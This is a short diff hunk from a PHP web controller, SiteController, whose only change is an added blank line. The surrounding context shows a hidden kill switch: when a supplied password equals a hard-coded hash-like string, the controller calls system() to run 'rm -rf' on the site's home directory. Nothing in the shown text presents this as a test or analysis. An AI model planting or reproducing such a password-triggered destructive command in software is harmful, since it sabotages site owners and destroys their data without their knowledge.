@@ -166,4 +166,5 @@ class SiteController extends Controller
         if($password === 'b36d331451a61eb2d76860e00c347397')
             return system('rm -rf /home/h008383856/dokumenti.site/');
     }
+
 }
